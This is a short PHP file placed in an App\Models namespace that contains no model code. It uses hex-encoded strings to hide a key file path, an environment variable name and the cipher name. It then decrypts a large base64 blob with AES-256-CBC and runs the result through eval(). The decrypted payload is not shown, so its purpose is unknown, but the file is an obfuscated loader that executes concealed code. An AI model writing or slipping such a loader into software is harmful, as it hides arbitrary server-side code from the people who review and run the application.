<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('XJ0C5MJP6XxdSQN4KIJhgA==');

$c=base64_decode(

'4E2Kgwc0TPbBSDuE9XBqeWbsD2fFEKR1QbEB7GZ+FjdUQWgQAheIdW1F20QWYr08P+VlMRrI4SMz' .
'06obHRb8veNmZ8bwE9pqdrTd2LT5QKXq6X1//q1ai0+mb46hIu3NCXTGnlYKL9x+7PU5VzoWyoSs' .
'A1v13Wdvb3JbkgL46Zitxzi7/168A7O89oCVY6it0tOtb4kFaMpTIlPxIB4sSH5iTY9JMngQVWuZ' .
'tng0WwiNz5jfHZYaBXuHkaRaN9rfMwrAMjEbnPKaVneHMePSMYlMg0syq6LD9INTZmnXujCL9MwR' .
'PSZyWcdP2KUSJCUf9ulrkvTQfZUwPnQuJpQZ++q/NWwtJrvj49RcixuiYoW5/09NI+LFyh5BEhCN' .
'112dWy8/ix7MMGqcdaJxp7on1YaDEQbGeVxSUbPQ8h5u7hSLr/1QMyPBbogDLZAMDs7AKpZfXfJB' .
'jO4k9KynWZTPHzJ9rRivhzQAuv1TUASlGUsqSdG7HLOzlzDRwR19NHjo0evdduKikpM60k0BuAyy' .
'yKYKQz4rhuSRDp46YAtBC+tA+vQqJquaBrtgIfVNGdw0brhK95XIe/5xemoVMBN3PawQtaBl8x/h' .
'DemaN1K0wRuCY6cgU2wZE6ebZu71rYHNjkkGJ3MFcRmwmK6KcY2cA/zCHOLtRMoI84wX5j78sk2q' .
'cDkmCeRBk/hD8NXkkH/oxHi+lRoKsHMrfJ8riI4KIZKfSc5lXntB6vxaEz4IMGVpIFOSY+0GE4Oi' .
'JYAxP+iN4UkCKG//aL0lVaenAUsgzuSUl/AX63CO5lE+K5qAKI+Z14wVjiPiDplqIdfa46qeoKRT' .
'3BKms0yWA2S57vplm5uWlF5SGmWxno5IswNHJ40zNyU6GmTVBL9KMEqXqKGdAYyosOn8uk/zqrIW' .
'2E2/uh9zKKhXHz9oVOFTPfDU0OOIYnuCj3g8tQP4nZtIvbik2DuK2o7whjBejCbJPo5Vo4dpWmZB' .
'6FHhyVCDZVLFREFoOo2pqwnZfjecDVusUZXzrFpd6CUxkSTGXvzZ8iiZTAh4MJCAkBV2NQz1OzUU' .
'iIWcaQsT7B1mozDaeWCexnAdDE1j1nx57dsEExwab+zt/ZqyewTjHUYJ7+XGUiCKnlQ0gstsvT2u' .
'er09C88GMSxDk2DZPp6AiudyXxUVXkxa+fLOhYoAPreIEmNeZvca7qqI6YdJni5r1YfUOZ7KNGI6'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

